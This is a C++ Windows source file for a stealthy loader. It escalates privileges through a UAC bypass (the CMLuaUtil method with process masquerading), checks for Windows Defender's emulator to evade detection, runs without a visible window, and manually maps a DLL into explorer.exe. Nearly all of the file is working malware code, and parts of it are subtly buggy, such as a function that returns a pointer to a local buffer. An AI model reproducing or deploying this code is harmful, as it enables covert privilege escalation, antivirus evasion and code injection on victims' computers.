#include "injection.h"
#include "utils.h"

#include <windows.h>
#include <string>
#include <iostream>
#include <WinUser.h>

#define OEMRESOURCE
#pragma comment(lib, "comctl32.lib")

extern "C" {
    #include "Shared/windefend.h"
    #include "global.h"
    #include "ntstatus.h"
}

WCHAR* ExePath();
std::string GetCWD();
NTSTATUS StartProcessAsAdmin(LPWSTR lpName);

#define JOIN(x, y) x ## y
#ifdef _WIN64
#define FULL_PATH(x) JOIN("C:\\Windows\\System32\\", x)
#else
#define FULL_PATH(x) JOIN("C:\\Windows\\SysWOW64\\", x)
#endif

#define		MY_DLL		"DllTest.dll"

#ifndef _WIN64
#define		MY_PROC		L"explorer.exe"
#else
#define		MY_PROC		"explorer.exe"
#endif

//WinMain is the entry point for windows subsystem (GUI apps) but without initializing the window the process will be hidden graphically
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

	//Must be called before calling UAC bypass due to it manipulating/faking executable information
	auto cwd = GetCWD();

    if (!Utils::IsElevated()) {
        StartProcessAsAdmin((LPWSTR)ExePath());
        return 0;
    }
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess(MY_PROC));
	if (!hProc) {
        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess(MY_PROC));
        Sleep(10000);
	}

	//Manual map my DLL inside target process and call DllMain
	auto pMyDll = ManualMap(hProc, (cwd + MY_DLL).c_str());
	if (!pMyDll) {
        pMyDll = ManualMap(hProc, (cwd + MY_DLL).c_str());
        Sleep(10000);
	}
	CloseHandle(hProc);

	return 0;
}

/*
* ucmInit
*
* Purpose:
*
* Prestart phase with MSE / Windows Defender anti-emulation part.
*
* Note:
*
* supHeapAlloc unavailable during this routine and calls from it.
*
*/
NTSTATUS ucmInit(
    _Inout_ UCM_METHOD* RunMethod,
    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
    _In_opt_ ULONG OptionalParameterLength,
    _In_ BOOL OutputToDebugger
)
{
    UCM_METHOD  Method;
    NTSTATUS    Result = STATUS_SUCCESS;
    LPWSTR      optionalParameter = NULL;
    ULONG       optionalParameterLength = 0;

#ifndef _DEBUG
    TOKEN_ELEVATION_TYPE    ElevType;
#endif	

    ULONG bytesIO;
    WCHAR szBuffer[MAX_PATH + 1];


    do {

        //we could read this from usershareddata but why not use it
        bytesIO = 0;
        RtlQueryElevationFlags(&bytesIO);
        if ((bytesIO & DBG_FLAG_ELEVATION_ENABLED) == 0) {
            Result = STATUS_ELEVATION_REQUIRED;
            break;
        }

        if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))) {
            Result = STATUS_INTERNAL_ERROR;
            break;
        }

        InitCommonControls();

        if (g_hInstance == NULL)
            g_hInstance = (HINSTANCE)NtCurrentPeb()->ImageBaseAddress;

        Method = *RunMethod;

#ifndef _DEBUG
        ElevType = TokenElevationTypeDefault;
        if (supGetElevationType(&ElevType)) {
            if (ElevType != TokenElevationTypeLimited) {
                return STATUS_NOT_SUPPORTED;
            }
        }
        else {
            Result = STATUS_INTERNAL_ERROR;
            break;
        }
#endif

        g_ctx = (PUACMECONTEXT)supCreateUacmeContext(Method,
            optionalParameter,
            optionalParameterLength,
            supEncodePointer(DecompressPayload),
            OutputToDebugger);


    } while (FALSE);

    if (g_ctx == NULL)
        Result = STATUS_FATAL_APP_EXIT;

    return Result;
}

NTSTATUS StartProcessAsAdmin(LPWSTR lpName) {

    NTSTATUS    Status;
    UCM_METHOD  method = UacMethodCMLuaUtil;

    wdCheckEmulatedVFS();

    Status = ucmInit(&method,
        NULL,
        0,
        FALSE);

    if (Status != STATUS_SUCCESS) {
        return Status;
    }

    supMasqueradeProcess(FALSE);
    PUCM_API_DISPATCH_ENTRY Entry;

    UCM_PARAMS_BLOCK ParamsBlock;

    if (wdIsEmulatorPresent3()) {
        return STATUS_NOT_SUPPORTED;
    }

    ucmCMLuaUtilShellExecMethod(lpName);
}

std::string GetCWD() {
    WCHAR buffer[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, buffer, MAX_PATH);
    std::wstring ws(buffer);
    std::string file_path(ws.begin(), ws.end());
    std::wstring::size_type pos = file_path.find_last_of("\\/");
    return file_path.substr(0, pos + 1);
}

WCHAR* ExePath() {
    WCHAR buffer[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, buffer, MAX_PATH);
    return buffer;
}